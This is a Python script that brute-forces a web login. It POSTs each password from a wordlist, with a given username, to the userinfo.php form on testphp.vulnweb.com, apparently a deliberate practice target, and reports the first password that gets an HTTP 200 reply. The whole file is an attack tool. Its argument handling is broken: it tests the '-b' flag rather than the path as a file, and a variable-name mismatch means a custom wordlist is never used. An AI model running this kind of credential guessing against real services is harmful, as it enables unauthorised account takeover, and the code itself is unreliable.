import sys
from pathlib import Path

from requests import post
from sys import argv

n = len(argv)
wordlist = "book2.txt"
print("total arguments passed: " + str(n))
print("1st argument: " + argv[0])

doRequest = False
defUsername = 0
defWordlist = 0

if n > 5:
    sys.exit("Error: Too many commands")
elif n == 5:
    if argv[1] == "-u":
        username = argv[2]
        defUsername = 2
    elif argv[1] == "-b" and Path(argv[1]).is_file():
        wordList = argv[2]
        defWordlist = 2
    if argv[3] == "-u":
        username = argv[4]
        defUsername = 4
    elif argv[3] == "-b" and Path(argv[3]).is_file():
        wordList = argv[4]
        defWordlist = 4
elif 5 > n > 1:
    if argv[1] == "-u":
        username = argv[2]
        defUsername = 2
    elif argv[1] == "-b" and Path(argv[1]).is_file():
        wordList = argv[2]
        defWordlist = 2

if defUsername:
    print("Successful username commandline argument, username: " + argv[defUsername])
else:
    print("username commandline argument not submitted, Default username: test")
    username = "test"
if defWordlist:
    print("Successful wordlist commandline argument, wordlist: " + argv[defWordlist])
else:
    print("wordlist commandline argument not submitted / not found, Default wordlist: book2.txt")
    wordlist = "book2.txt"

isLoggedIn = False
url = "http://testphp.vulnweb.com/userinfo.php"
with open(wordlist) as thefile:
    for line in thefile:
        password = line.rstrip()  # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
        payload = {"uname": username, "pass": password}
        request = post(url, data=payload, allow_redirects=False)
        if request.status_code == 200:
            print(username + " logged in with " + password)
            isLoggedIn = True
            exit()
    if not isLoggedIn:
        print("Couldn't log in with username and/or wordlist")

